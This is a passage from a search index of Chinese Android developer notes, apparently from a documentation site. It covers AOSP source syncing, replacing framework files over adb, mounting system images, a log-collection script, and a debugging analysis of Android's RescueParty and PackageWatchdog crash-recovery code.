android-12.1.0\n</code></pre>"},{"location":"Android/Android10%E6%BA%90%E7%A0%81%E4%B8%8B%E8%BD%BD/#httpsmirrorstunatsinghuaeducnhelpaosp","title":"\u6e05\u534e\u6e90 :\u3000https://mirrors.tuna.tsinghua.edu.cn/help/AOSP/","text":"<p>\u540c\u6b65android-security-10.0.0_r66\u4ee3\u7801\uff1a</p> <pre><code>mkdir android10-security-release &amp;&amp; cd android10-security-release\nrepo init --depth 1 -u https://mirrors.tuna.tsinghua.edu.cn/git/AOSP/platform/manifest -b android-security-10.0.0_r66\nrepo sync -c -j4\n</code></pre> <p>\u540c\u6b65android-12.1.0_r5\u4ee3\u7801\uff1a</p> <pre><code>mkdir android-12.1.0 &amp;&amp; cd android-12.1.0\nrepo init --depth 1 -u https://mirrors.tuna.tsinghua.edu.cn/git/AOSP/platform/manifest -b android-12.1.0_r5\nrepo sync -c -j4\n</code></pre>"},{"location":"Android/Android10%E6%BA%90%E7%A0%81%E4%B8%8B%E8%BD%BD/#lineageos-171","title":"\u4e8c\u3001\u4e0b\u8f7dLineageOS-17.1","text":"<p>\u53c2\u8003https://wiki.lineageos.org/devices/bacon/build\uff1a</p> <pre><code>mkdir Lineage-17.1/\ncd Lineage-17.1/\nrepo init -u https://github.com/LineageOS/android.git -b lineage-17.1\nrepo sync -c -j8\n</code></pre>"},{"location":"Android/Android%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/","title":"Android\u57fa\u7840\u64cd\u4f5c","text":"<p>Android\u57fa\u7840\u64cd\u4f5c.md</p>"},{"location":"Android/Android%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/#1","title":"1 \u5de5\u5177\uff1a\u5f00\u53d1\u5de5\u5177\u7bb1","text":""},{"location":"Android/Android%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/#2","title":"2 \u7f16\u8bd1\u66ff\u6362","text":"<pre><code>C:\\Users\\hamilton\\Desktop\\file&gt;adb root\nrestarting adbd as root\n\nC:\\Users\\hamilton\\Desktop\\file&gt;adb remount\nremount succeeded\n\nC:\\Users\\hamilton\\Desktop\\file&gt;adb push services.jar /system/framework/\n....\n\nC:\\Users\\hamilton\\Desktop\\file&gt;adb push framework.jar /system/framework/\nC:\\Users\\hamilton\\Desktop\\file&gt;adb shell rm -rf /system/framework/oat/\nC:\\Users\\hamilton\\Desktop\\file&gt;adb shell rm -rf /system/framework/arm/\nC:\\Users\\hamilton\\Desktop\\file&gt;adb shell rm -rf /system/framework/arm64/\n....\nC:\\Users\\hamilton\\Desktop\\file&gt;adb push CarService.apk /system/priv-app/CarService/CarService.apk\n....\nC:\\Users\\hamilton\\Desktop\\file&gt;adb push android.hardware.automotive.audiocontrol@1.0-service /vendor/bin/hw/android.hardware.automotive.audiocontrol@1.0-service\n....\n\nC:\\Users\\hamilton\\Desktop\\file&gt;adb reboot\n</code></pre> <p>https://blog.csdn.net/superlee1125/article/details/115491698 \u7f16\u8bd1\u51faframework.jar\u540e\uff0c\u5148\u7528\u4e0b\u9762\u7684\u547d\u4ee4remount\uff1a</p> <p><code>adb root;adb remount</code></p> <p>\u7136\u540e\u628a<code>framework.jar</code> push\u5230<code>system/framework/</code>\u4e0b\u9762\uff0c\u540c\u65f6\u8fd8\u8981\u5220\u9664\u8fd9\u4e2a\u76ee\u5f55\u4e0b\u9762\u7684<code>oat</code>\uff0c<code>arm</code>\uff0c<code>arm64</code>\u4e09\u4e2a\u76ee\u5f55(\u4e0d\u5220\u9664\u4f1a\u4e00\u76f4\u5361\u5728\u5f00\u673a\u52a8\u753b)\uff0c\u6700\u540e\u518d\u8fd0\u884c\u4e0b\u9762\u7684\u547d\u4ee4\u91cd\u542fzygote\uff0c\u8fd9\u6837\u65b0\u66ff\u6362\u7684<code>framework.jar</code>\u5c31\u751f\u6548\u4e86\u3002</p> <p><code>adb shell stop;adb shell start;</code></p> <p>\u66ff\u6362\u540e\u7684\u6587\u4ef6\u5728<code>/mnt/scratch/overlay/</code>\u4e0b\u9762</p> <pre><code>D:\\tmp&gt;adb shell ls /mnt/scratch/overlay/\nproduct\nsystem\nvendor\n</code></pre>"},{"location":"Android/Android%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/#3-img","title":"3 \u6302\u8f7dimg\u6587\u4ef6:","text":""},{"location":"Android/Android%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/#systemimg","title":"system.img","text":"<p>\u9996\u5148\uff0c\u9700\u8981\u7528<code>simg2img</code>\u5de5\u5177\u628a<code>system.img</code>\u8f6c\u4e3a\u4e3a<code>ext4</code>\u6587\u4ef6\u683c\u5f0f\uff0c\u8be5\u5de5\u5177\u4f4d\u4e8e<code>out/host/linux-x86/bin/simg2img</code>\uff0c\u53ef\u4ee5\u4f7f\u7528apt-get\u5b89\u88c5:</p> <pre><code>apt-get install simg2img\n</code></pre> <p>\u518d\u4f7f\u7528\u5de5\u5177\u8fdb\u884c\u8f6c\u6362\uff1a</p> <pre><code>simg2img system.img system_new.img\n</code></pre> <p>\u4f1a\u5f97\u5230\u4e00\u4e2a<code>system_new.img</code>\uff0c\u5b83\u662f raw \u683c\u5f0f\u7684\u5b8c\u6574\u955c\u50cf:</p> <p>\u7528Linux\u6302\u8f7d\u547d\u4ee4\u8fdb\u884c\u6302\u8f7d\uff1a</p> <pre><code>sudo mount -t ext4 system_new.img XXX\n</code></pre> <p>\u6302\u8f7d\u5b8c\u68c0\u67e5\u5168\u7f16\u7684\u955c\u50cf\u4e2d\u662f\u5426\u6709\u81ea\u5df1\u7684apk.</p>"},{"location":"Android/Android%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/#superimg","title":"super.img","text":"<ol> <li>\u7f16\u8bd1 lpunpack \u5de5\u5177 (\u751f\u6210\u6587\u4ef6\u6240\u5728\u76ee\u5f55\uff1a<code>out_sys/host/linux-x86/bin</code>)</li> </ol> <pre><code>source build/envsetup.sh\nmake lpunpack\n</code></pre> <ol> <li>\u5c06 super.img \u4ece Android sparse image \u8f6c\u6362\u4e3a raw image</li> </ol> <pre><code>simg2img super.img super.img_raw\n</code></pre> <ol> <li>\u4ece raw image \u89e3\u5305\u51fa\u5206\u533a\u955c\u50cf\u6587\u4ef6</li> </ol> <pre><code>./lpunpack -p system super.img_raw  system   # \u8fd9\u91cc sytem \u662f\u76ee\u6807\u76ee\u5f55\uff0c\u53ef\u4ee5\u81ea\u5df1\u521b\u5efa\n</code></pre> <ol> <li>\u7528Linux\u6302\u8f7d\u547d\u4ee4\u8fdb\u884c\u6302\u8f7d\uff1a</li> </ol> <pre><code>sudo mount -t ext4 system.img XXX\n</code></pre>"},{"location":"Android/Android%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/#4","title":"4 \u6293\u65e5\u5fd7","text":"<p><code>getLogs.bat</code></p> <pre><code>adb root\n\nset d=%date:~0,4%%date:~5,2%%date:~8,2%\nif %time:~0,2% LEQ 9 (set t=0%time:~1,1%%time:~3,2%%time:~6,2%) else (set t=%time:~0,2%%time:~3,2%%time:~6,2%) \necho %d%-%t%\nmkdir Log-%d%-%t%\ncd Log-%d%-%t%\n\nadb shell ps -A &gt; ps.txt\n::\n::adb shell am dumpheap 1051 /data/local/tmp/system-server.hprof\n:: \u5b89\u88c5GitBash, \u5e76\u5c06C:\\Program Files\\Git\\usr\\bin \u52a0\u5230\u73af\u5883\u53d8\u91cf \ngrep system_server ps.txt | awk \"{print $2}\" | xargs -I {} echo adb shell am dumpheap {} /data/local/tmp/system-server.hprof &gt; tmp.bat\necho adb pull /data/local/tmp/system-server.hprof &gt;&gt; tmp.bat\necho adb shell rm /data/local/tmp/system-server.hprof &gt;&gt; tmp.bat\n\ngrep mediaserver ps.txt | awk \"{print $2}\" |xargs -I {} echo adb shell debuggerd -b {} \"&gt; mediaserver.txt\"  &gt;&gt; tmp.bat\n\necho exit &gt;&gt; tmp.bat\nstart tmp.bat \ncat tmp.bat\n\nadb pull /data/log\nadb pull /data/anr\nadb pull /data/tombstones\nadb pull /data/system/dropbox\nadb pull /sys/kernel/debug/binder\n\nmd _dump\ncd _dump\n\nadb shell uiautomator dump /data/local/tmp/app.uix \nadb pull /data/local/tmp/app.uix\nadb shell screencap -p /sdcard/app.png\nadb pull /sdcard/app.png\n\nadb shell top -n 1 &gt; top.txt\nadb shell free -m &gt; free.txt\nadb shell procrank &gt; procrank.txt\nadb shell dumpsys &gt; dumpsys.txt\nadb shell dumpsys car_service  &gt; dumpsys_car_service.txt\nadb shell dumpsys meminfo system_server &gt; system_server_mem.txt\nadb shell dumpsys meminfo mediaserver &gt; mediaserver_mem.txt\nadb shell dmesg &gt; dmsg.txt\ncd ..\n\nadb shell perfetto -o /data/misc/perfetto-traces/trace_file.perfetto-trace -t 30s sched freq idle am wm gfx view binder_driver hal dalvik camera input res memory\nadb pull /data/misc/perfetto-traces/trace_file.perfetto-trace\n\ndel tmp.bat\ncd ..\n\npause\n\n</code></pre> <p>Systrace \u7b80\u4ecb</p> <p><code>adb shell perfetto -o /data/misc/perfetto-traces/trace_file.perfetto-trace -t 20s sched freq idle am wm gfx view binder_driver hal dalvik camera input res memory</code></p> <p>\u7f51\u7ad9: <code>https://ui.perfetto.dev/#!/</code></p> <pre><code>\u505a\u7cfb\u7edf\u7a33\u5b9a\u6027\u95ee\u9898\u5206\u6790\uff0c\u5f53\u9047\u5230\u7cfb\u7edf\u5361\u6b7b\u65f6\uff0c\u6211\u4eec\u7ecf\u5e38\u8981\u4f7f\u7528\u201ckill -3 pid\u201d\u6765\u6253\u5370System_Server\u8fdb\u7a0b\u5404\u4e2a\u7ebf\u7a0b\u7684Java\u8c03\u7528\u6808\uff0c\u6839\u636e\u7ebf\u7a0b\u72b6\u6001\u53ca\u8c03\u7528\u6808\u6765\u66f4\u8fdb\u4e00\u6b65\u5b9a\u4f4d\u95ee\u9898\u70b9\uff0c\u5f53\u7136\u67d0\u4e2a\u5e94\u8be5\u754c\u9762\u5361\u987f\u65f6\u95f4\u957f\u65f6\u4e5f\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e2a\u547d\u4ee4\u6765\u6293\u53d6Java\u8c03\u7528\u6808\u8fdb\u884c\u5206\u6790\u3002\n\u6ce8\u610fnative\u8fdb\u7a0b\u662f\u4e0d\u80fd\u7528kill -3\u6765\u6253trace\u7684\uff0c\u800c\u662f\u4f7f\u7528debuggerd.\n</code></pre> <pre><code>adb shell dumpsys car_service  --help\nadb shell dumpsys car_service  --services CarAudioService &gt; CarAudioService.txt  # dump CarAudioService\n</code></pre>"},{"location":"Android/%E6%81%A2%E5%A4%8D%E6%A8%A1%E5%BC%8F/","title":"\u6062\u590d\u6a21\u5f0f","text":""},{"location":"Android/%E6%81%A2%E5%A4%8D%E6%A8%A1%E5%BC%8F/#0-demo","title":"0 \u7ed3\u8bba: <code>Demo</code>\u5e94\u8be5\u5982\u4f55\u5199","text":"<ul> <li><code>Demo</code>\u5e94\u8be5\u5728<code>1\u5206\u949f</code>\u5185\u81f3\u5c11\u6302\u6389<code>5\u6b21</code></li> <li><code>RescueParty</code>\u5e94\u8be5\u5408\u5165\u4fee\u590d\u4ee3\u7801, \u5426\u5219\u4e0d\u80fd\u8fdb\u5165<code>recovery</code>(\u5426\u5219<code>mayObservePackage</code>\u8fd4\u56de\u5931\u8d25)</li> <li><code>Demo</code>\u5e94\u8be5\u662f<code>android:persistent=\"true\"</code>\u7684, (\u5426\u5219<code>mayObservePackage</code>\u8fd4\u56de\u5931\u8d25)</li> <li>\u4e0d\u8981\u5b58\u5728<code>adb</code>\u8fde\u63a5, \u5426\u5219\u5224\u65ad\u662f\u7528\u6237\u5728\u8c03\u8bd5.(<code>isDisabled</code>\u5224\u65ad\u6210\u529f, \u7528\u6237\u8c03\u8bd5)</li> </ul> <p><code>Demo</code>\u4ee3\u7801:</p> <pre><code>    &lt;application\n        ...\n        android:name=\".CrashApp\"\n        android:persistent=\"true\"&gt;\n</code></pre> <pre><code>public class CrashApp extends Application {\n    boolean flag = true;\n    @Override\n    public final void onCreate() {\n        super.onCreate();\n\n        new Handler().postDelayed(new Runnable() {\n            @Override\n            public void run() {\n                Log.e(\"==&gt;\", \"1/0 = \" + (flag ? 1/0 : 1/1) );\n            }\n        }, 100);\n    }\n}\n</code></pre>"},{"location":"Android/%E6%81%A2%E5%A4%8D%E6%A8%A1%E5%BC%8F/#1-systemserver","title":"1 \u76d1\u542cSystemServer\u5d29\u6e83","text":"<p>SystemServer\u4e2d, RescueParty\u6ce8\u518c\u76d1\u542c\u5668, \u5e76\u542f\u52a8PackageWatchdog,  \u5982\u679c\u6bcf\u6b21<code>10ms</code>\u5185<code>system server</code>\u53d1\u751f\u9519\u8bef, \u8fde\u7eed\u53d1\u751f\u4e86<code>\u5927\u4e8e\u7b49\u4e8e5\u6b21</code>, \u5219\u6267\u884c<code>executeBootLoopMitigation</code> \u5982\u679cAPP\u53d1\u751f\u4e86\u7cdf\u7cd5\u7684\u5d29\u6e83, \u5219\u6267\u884c<code>execute</code></p> <p>http://www.aospxref.com/android-11.0.0_r21/xref/frameworks/base/services/java/com/android/server/SystemServer.java</p> <pre><code>\n710      private void startBootstrapServices(@NonNull TimingsTraceAndSlog t) {\n711          t.traceBegin(\"startBootstrapServices\");\n...\n802          // Bring up recovery system in case a rescue party needs a reboot\n803          t.traceBegin(\"StartRecoverySystemService\");\n804          mSystemServiceManager.startService(RecoverySystemService.Lifecycle.class);\n805          t.traceEnd();\n806  \n807          // Now that we have the bare essentials of the OS up and running, take\n808          // note that we just booted, which might send out a rescue party if\n809          // we're stuck in a runtime restart loop.\n810          RescueParty.registerHealthObserver(mSystemContext);\n811          PackageWatchdog.getInstance(mSystemContext).noteBoot();\n\n1013 \u00a0    /**\n1014 \u00a0     * Starts a miscellaneous grab bag of stuff that has yet to be refactored and organized.\n1015 \u00a0     */\n1016 \u00a0    private void startOtherServices(@NonNull TimingsTraceAndSlog t) {\n1017 \u00a0        t.traceBegin(\"startOtherServices\");\n\n1121 \u00a0            t.traceBegin(\"InstallSystemProviders\");\n1122 \u00a0            mActivityManagerService.installSystemProviders();\n1123 \u00a0            // Now that SettingsProvider is ready, reactivate SQLiteCompatibilityWalFlags\n1124 \u00a0            SQLiteCompatibilityWalFlags.reset();\n1125 \u00a0            t.traceEnd();\n</code></pre> <p>http://www.aospxref.com/android-11.0.0_r21/xref/frameworks/base/services/core/java/com/android/server/PackageWatchdog.java</p> <pre><code>123      static final int DEFAULT_BOOT_LOOP_TRIGGER_COUNT = 5;\n124      static final long DEFAULT_BOOT_LOOP_TRIGGER_WINDOW_MS = TimeUnit.MINUTES.toMillis(10);\n\n206      PackageWatchdog(Context context, AtomicFile policyFile, Handler shortTaskHandler,\n207              Handler longTaskHandler, ExplicitHealthCheckController controller,\n208              ConnectivityModuleConnector connectivityModuleConnector, SystemClock clock) {\n209          mContext = context;\n210          mPolicyFile = policyFile;\n211          mShortTaskHandler = shortTaskHandler;\n212          mLongTaskHandler = longTaskHandler;\n213          mHealthCheckController = controller;\n214          mConnectivityModuleConnector = connectivityModuleConnector;\n215          mSystemClock = clock;\n216          mNumberOfNativeCrashPollsRemaining = NUMBER_OF_NATIVE_CRASH_POLLS;\n217          mBootThreshold = new BootThreshold(DEFAULT_BOOT_LOOP_TRIGGER_COUNT,\n218                  DEFAULT_BOOT_LOOP_TRIGGER_WINDOW_MS);\n219          loadFromFile();\n220          sPackageWatchdog = this;\n221      }\n222  \n\n442      /**\n443       * Called when the system server boots. If the system server is detected to be in a boot loop,\n444       * query each observer and perform the mitigation action with the lowest user impact.\n445       */\n446      public void noteBoot() {\n447          synchronized (mLock) {\n448              if (mBootThreshold.incrementAndTest()) {\n449                  mBootThreshold.reset();\n450                  PackageHealthObserver currentObserverToNotify = null;\n451                  int currentObserverImpact = Integer.MAX_VALUE;\n452                  for (int i = 0; i &lt; mAllObservers.size(); i++) {\n453                      final ObserverInternal observer = mAllObservers.valueAt(i);\n454                      PackageHealthObserver registeredObserver = observer.registeredObserver;\n455                      if (registeredObserver != null) {\n456                          int impact = registeredObserver.onBootLoop();\n457                          if (impact != PackageHealthObserverImpact.USER_IMPACT_NONE\n458                                  &amp;&amp; impact &lt; currentObserverImpact) {\n459                              currentObserverToNotify = registeredObserver;\n460                              currentObserverImpact = impact;\n461                          }\n462                      }\n463                  }\n464                  if (currentObserverToNotify != null) {\n465                      currentObserverToNotify.executeBootLoopMitigation();\n466                  }\n467              }\n468          }\n469      }\n     /**\n1463       * Handles the thresholding logic for system server boots.\n1464       */\n1465      static class BootThreshold {\n1466  \n1467          private final int mBootTriggerCount;\n1468          private final long mTriggerWindow;\n1469  \n1470          BootThreshold(int bootTriggerCount, long triggerWindow) {\n1471              this.mBootTriggerCount = bootTriggerCount;\n1472              this.mTriggerWindow = triggerWindow;\n1473          }\n\n1498          /** Increments the boot counter, and returns whether the device is bootlooping. */\n1499          public boolean incrementAndTest() {\n1500              final long now = android.os.SystemClock.elapsedRealtime();\n1501              if (now - getStart() &lt; 0) {\n1502                  Slog.e(TAG, \"Window was less than zero. Resetting start to current time.\");\n1503                  setStart(now);\n1504              }\n1505              final long window = now - getStart();\n1506              if (window &gt;= mTriggerWindow) {\n1507                  setCount(1);\n1508                  setStart(now);\n1509                  return false;\n1510              } else {\n1511                  int count = getCount() + 1;\n1512                  setCount(count);\n1513                  EventLogTags.writeRescueNote(Process.ROOT_UID, count, window);\n1514                  return count &gt;= mBootTriggerCount;\n1515              }\n1516          }\n</code></pre>"},{"location":"Android/%E6%81%A2%E5%A4%8D%E6%A8%A1%E5%BC%8F/#2-app","title":"2 \u76d1\u542cAPP\u53d1\u751f\u4e86\u7cdf\u7cd5\u7684\u5d29\u6e83","text":"<p><code>onPackagesReady</code>\u5b8c\u6210\u52a0\u8f7d\u914d\u7f6e<code>(updateConfigs</code>),  \u5982\u679c\u7b26\u5408\u5224\u65ad\u6761\u4ef6, \u5219\u901a\u8fc7\u51fd\u6570<code>execute</code>\u6267\u884c\u56de\u8c03\u7684\u63a5\u53e3: </p> <p>\u914d\u7f6e\u6587\u4ef6:</p> <pre><code>spm8675p1_64:/ # cat /data/system/package-watchdog.xml\n&lt;?xml version='1.0' encoding='utf-8' standalone='yes' ?&gt;\n&lt;package-watchdog version=\"1\"&gt;\n&lt;observer name=\"rescue-party-observer\" /&gt;\n&lt;observer name=\"rollback-observer\" /&gt;\n&lt;/package-watchdog&gt;\n</code></pre> <pre><code>\n758      /**\n759       * Syncs the state of the observers.\n760       *\n761       * &lt;p&gt; Prunes all observers, saves new state to disk, syncs health check requests with the\n762       * health check service and schedules the next state sync.\n763       */\n764      private void syncState(String reason) {\n765          synchronized (mLock) {\n766              Slog.i(TAG, \"Syncing state, reason: \" + reason);\n767              pruneObserversLocked();\n768  \n769              saveToFileAsync();\n770              syncRequestsAsync();\n771  \n772              // Done syncing state, schedule the next state sync\n773              scheduleNextSyncStateLocked();\n774          }\n775      }\n\n191      private PackageWatchdog(Context context) {\n192          // Needs to be constructed inline\n193          this(context, new AtomicFile(\n194                          new File(new File(Environment.getDataDirectory(), \"system\"),\n195                                  \"package-watchdog.xml\")),\n\n968      /**\n969       * Persists mAllObservers to file. Threshold information is ignored.\n970       */\n971      private boolean saveToFile() {\n972          Slog.i(TAG, \"Saving observer state to file\");\n973          synchronized (mLock) {\n974              FileOutputStream stream;\n975              try {\n976                  stream = mPolicyFile.startWrite();\n977              } catch (IOException e) {\n978                  Slog.w(TAG, \"Cannot update monitored packages\", e);\n979                  return false;\n980              }\n981  \n982              try {\n983                  XmlSerializer out = new FastXmlSerializer();\n...\n\n291      public void startObservingHealth(PackageHealthObserver observer, List&lt;String&gt; packageNames,\n292              long durationMs) {\n293          if (packageNames.isEmpty()) {\n294              Slog.wtf(TAG, \"No packages to observe, \" + observer.getName());\n295              return;\n296          }\n297          if (durationMs &lt; 1) {\n298              Slog.wtf(TAG, \"Invalid duration \" + durationMs + \"ms for observer \"\n299                      + observer.getName() + \". Not observing packages \" + packageNames);\n300              durationMs = DEFAULT_OBSERVING_DURATION_MS;\n301          }\n302  \n303          List&lt;MonitoredPackage&gt; packages = new ArrayList&lt;&gt;();\n304          for (int i = 0; i &lt; packageNames.size(); i++) {\n305              // Health checks not available yet so health check state will start INACTIVE\n306              MonitoredPackage pkg = newMonitoredPackage(packageNames.get(i), durationMs, false);\n307              if (pkg != null) {\n308                  packages.add(pkg);\n309              }\n310          }\n\n1213      MonitoredPackage newMonitoredPackage(\n1214              String name, long durationMs, boolean hasPassedHealthCheck) {\n1215          return newMonitoredPackage(name, durationMs, Long.MAX_VALUE, hasPassedHealthCheck);\n1216      }\n\n1218      MonitoredPackage newMonitoredPackage(String name, long durationMs, long healthCheckDurationMs,\n1219              boolean hasPassedHealthCheck) {\n1220          VersionedPackage pkg = getVersionedPackage(name);\n1221          if (pkg == null) {\n1222              return null;\n1223          }\n1224          return new MonitoredPackage(pkg, durationMs, healthCheckDurationMs, hasPassedHealthCheck);\n1225      }\n\n1234      class MonitoredPackage {\n1235          private final VersionedPackage mPackage;\n\n1421          @HealthCheckState\n1422          private int updateHealthCheckStateLocked() {\n1423              int oldState = mHealthCheckState;\n1424              if (mHasPassedHealthCheck) {\n1425                  // Set final state first to avoid ambiguity\n1426                  mHealthCheckState = HealthCheckState.PASSED;\n1427              } else if (mHealthCheckDurationMs &lt;= 0 || mDurationMs &lt;= 0) {\n1428                  // Set final state first to avoid ambiguity\n1429                  mHealthCheckState = HealthCheckState.FAILED;\n1430              } else if (mHealthCheckDurationMs == Long.MAX_VALUE) {\n1431                  mHealthCheckState = HealthCheckState.INACTIVE;\n1432              } else {\n1433                  mHealthCheckState = HealthCheckState.ACTIVE;\n1434              }\n1435              Slog.i(TAG, \"Updated health check state for package \" + getName() + \": \"\n1436                      + toString(oldState) + \" -&gt; \" + toString(mHealthCheckState));\n1437              return mHealthCheckState;\n1438          }\n\n1011      /** Dump status of every observer in mAllObservers. */\n1012      public void dump(IndentingPrintWriter pw) {\n1013          pw.println(\"Package Watchdog status\");\n1014          pw.increaseIndent();\n1015          synchronized (mLock) {\n1016              for (String observerName : mAllObservers.keySet()) {\n1017                  pw.println(\"Observer name: \" + observerName);\n1018                  pw.increaseIndent();\n1019                  ObserverInternal observerInternal = mAllObservers.get(observerName);\n1020                  observerInternal.dump(pw);\n1021                  pw.decreaseIndent();\n1022              }\n1023          }\n1024      }\n</code></pre> <p>\u5f53\u5e94\u7528\u6302\u6389\u65f6\u95f4\u95f4\u9694\u4e0d\u5927\u4e8e<code>1min</code>(<code>mTriggerFailureDurationMs</code>), \u4e14\u6302\u6389\u7684\u6b21\u6570\u4e0d\u5c0f\u4e8e<code>5\u4e2a</code>, \u5219<code>onFailureLocked</code>\u8fd4\u56de<code>true</code> \u5f53<code>onFailureLocked</code>\u8fd4\u56de<code>true</code>, \u5bf9\u76d1\u542c\u5668\u6267\u884c<code>onHealthCheckFailed</code>,\u5982\u679c\u7ed3\u679c\u4e0d\u662f<code>USER_IMPACT_NONE</code>, \u5219\u6700\u7ec8\u6267\u884c\u5230<code>execute</code>.</p> <p>http://www.aospxref.com/android-11.0.0_r21/xref/frameworks/base/services/core/java/com/android/server/am/AppErrors.java</p> <pre><code>406      /**\n407       * Bring up the \"unexpected error\" dialog box for a crashing app.\n408       * Deal with edge cases (intercepts from instrumented applications,\n409       * ActivityController, error intent receivers, that sort of thing).\n410       * @param r the application crashing\n411       * @param crashInfo describing the failure\n412       */\n413      void crashApplication(ProcessRecord r, ApplicationErrorReport.CrashInfo crashInfo) {\n414          final int callingPid = Binder.getCallingPid();\n415          final int callingUid = Binder.getCallingUid();\n416  \n417          final long origId = Binder.clearCallingIdentity();\n418          try {\n419              crashApplicationInner(r, crashInfo, callingPid, callingUid);\n420          } finally {\n421              Binder.restoreCallingIdentity(origId);\n422          }\n423      }\n\n425      void crashApplicationInner(ProcessRecord r, ApplicationErrorReport.CrashInfo crashInfo,\n426              int callingPid, int callingUid) {\n427          long timeMillis = System.currentTimeMillis();\n428          String shortMsg = crashInfo.exceptionClassName;\n429          String longMsg = crashInfo.exceptionMessage;\n430          String stackTrace = crashInfo.stackTrace;\n431          if (shortMsg != null &amp;&amp; longMsg != null) {\n432              longMsg = shortMsg + \": \" + longMsg;\n433          } else if (shortMsg != null) {\n434              longMsg = shortMsg;\n435          }\n436  \n437          if (r != null) {\n438              mPackageWatchdog.onPackageFailure(r.getPackageListWithVersionCode(),\n439                      PackageWatchdog.FAILURE_REASON_APP_CRASH);\n440  \n441              mService.mProcessList.noteAppKill(r, (crashInfo != null\n442                        &amp;&amp; \"Native crash\".equals(crashInfo.exceptionClassName))\n443                        ? ApplicationExitInfo.REASON_CRASH_NATIVE\n444                        : ApplicationExitInfo.REASON_CRASH,\n445                        ApplicationExitInfo.SUBREASON_UNKNOWN,\n446                      \"crash\");\n447          }\n</code></pre> <p>http://www.aospxref.com/android-11.0.0_r21/xref/frameworks/base/services/core/java/com/android/server/PackageWatchdog.java</p> <pre><code>359      /**\n360       * Called when a process fails due to a crash, ANR or explicit health check.\n361       *\n362       * &lt;p&gt;For each package contained in the process, one registered observer with the least user\n363       * impact will be notified for mitigation.\n364       *\n365       * &lt;p&gt;This method could be called frequently if there is a severe problem on the device.\n366       */\n367      public void onPackageFailure(List&lt;VersionedPackage&gt; packages,\n368              @FailureReasons int failureReason) {\n369          if (packages == null) {\n370              Slog.w(TAG, \"Could not resolve a list of failing packages\");\n371              return;\n372          }\n373          mLongTaskHandler.post(() -&gt; {\n374              synchronized (mLock) {\n375                  if (mAllObservers.isEmpty()) {\n376                      return;\n377                  }\n378                  boolean requiresImmediateAction = (failureReason == FAILURE_REASON_NATIVE_CRASH\n379                          || failureReason == FAILURE_REASON_EXPLICIT_HEALTH_CHECK);\n380                  if (requiresImmediateAction) {\n381                      handleFailureImmediately(packages, failureReason);\n382                  } else {\n383                      for (int pIndex = 0; pIndex &lt; packages.size(); pIndex++) {\n384                          VersionedPackage versionedPackage = packages.get(pIndex);\n385                          // Observer that will receive failure for versionedPackage\n386                          PackageHealthObserver currentObserverToNotify = null;\n387                          int currentObserverImpact = Integer.MAX_VALUE;\n388  \n389                          // Find observer with least user impact\n390                          for (int oIndex = 0; oIndex &lt; mAllObservers.size(); oIndex++) {\n391                              ObserverInternal observer = mAllObservers.valueAt(oIndex);\n392                              PackageHealthObserver registeredObserver = observer.registeredObserver;\n393                              if (registeredObserver != null\n394                                      &amp;&amp; observer.onPackageFailureLocked(\n395                                      versionedPackage.getPackageName())) {\n396                                  int impact = registeredObserver.onHealthCheckFailed(\n397                                          versionedPackage, failureReason);\n398                                  if (impact != PackageHealthObserverImpact.USER_IMPACT_NONE\n399                                          &amp;&amp; impact &lt; currentObserverImpact) {\n400                                      currentObserverToNotify = registeredObserver;\n401                                      currentObserverImpact = impact;\n402                                  }\n403                              }\n404                          }\n405  \n406                          // Execute action with least user impact\n407                          if (currentObserverToNotify != null) {\n408                              currentObserverToNotify.execute(versionedPackage, failureReason);\n409                          }\n410                      }\n411                  }\n412              }\n413          });\n414      }\n</code></pre> <p>http://www.aospxref.com/android-11.0.0_r21/xref/frameworks/base/services/core/java/com/android/server/RescueParty.java</p> <pre><code>419          @Override\n420          public int onHealthCheckFailed(@Nullable VersionedPackage failedPackage,\n421                  @FailureReasons int failureReason) {\n422              if (!isDisabled() &amp;&amp; (failureReason == PackageWatchdog.FAILURE_REASON_APP_CRASH\n423                      || failureReason == PackageWatchdog.FAILURE_REASON_APP_NOT_RESPONDING)) {\n424                  return mapRescueLevelToUserImpact(getNextRescueLevel());\n425              } else {\n426                  return PackageHealthObserverImpact.USER_IMPACT_NONE;\n427              }\n428          }\n</code></pre> <p>\u901a\u8fc7\u52a0log, \u53d1\u73b0<code>onPackageFailure</code>\u88ab\u8c03\u7528\u4e86, \u4f46\u662f<code>currentObserverToNotify</code>\u4e3a<code>null</code>, \u6240\u4ee5\u8ddf\u8e2a<code>observer.onPackageFailureLocked</code>\u67e5\u770b\u4e3a\u5565\u4e3a<code>false</code>: \u901a\u8fc7\u589e\u52a0log\u6253\u5370, \u53d1\u73b0<code>RescueParty</code>\u5b58\u5728Bug:</p> <pre><code>11-08 08:55:37.174  1153  1403 W RescueParty: ==&gt;packageName = com.demo\n11-08 08:55:37.174  1153  1826 W ActivityTaskManager:   Force finishing activity com.demo/.MainActivity\n11-08 08:55:37.176  1153  1403 W RescueParty: NameNotFoundException\n11-08 08:55:37.176  1153  1403 W RescueParty: android.content.pm.PackageManager$NameNotFoundException: No module info for package: com.demo\n11-08 08:55:37.176  1153  1403 W RescueParty:   at android.app.ApplicationPackageManager.getModuleInfo(ApplicationPackageManager.java:1010)\n11-08 08:55:37.176  1153  1403 W RescueParty:   at com.android.server.RescueParty$RescuePartyObserver.mayObservePackage(RescueParty.java:459)\n11-08 08:55:37.176  1153  1403 W RescueParty:   at com.android.server.PackageWatchdog$ObserverInternal.onPackageFailureLocked(PackageWatchdog.java:1125)\n11-08 08:55:37.176  1153  1403 W RescueParty:   at com.android.server.PackageWatchdog.lambda$onPackageFailure$4$PackageWatchdog(PackageWatchdog.java:398)\n11-08 08:55:37.176  1153  1403 W RescueParty:   at com.android.server.-$$Lambda$PackageWatchdog$Ya4lYGbdDy3Dda20wvc2AHBqIMM.run(Unknown Source:6)\n11-08 08:55:37.176  1153  1403 W RescueParty:   at android.os.Handler.handleCallback(Handler.java:938)\n11-08 08:55:37.176  1153  1403 W RescueParty:   at android.os.Handler.dispatchMessage(Handler.java:99)\n11-08 08:55:37.176  1153  1403 W RescueParty:   at android.os.Looper.loop(Looper.java:223)\n11-08 08:55:37.176  1153  1403 W 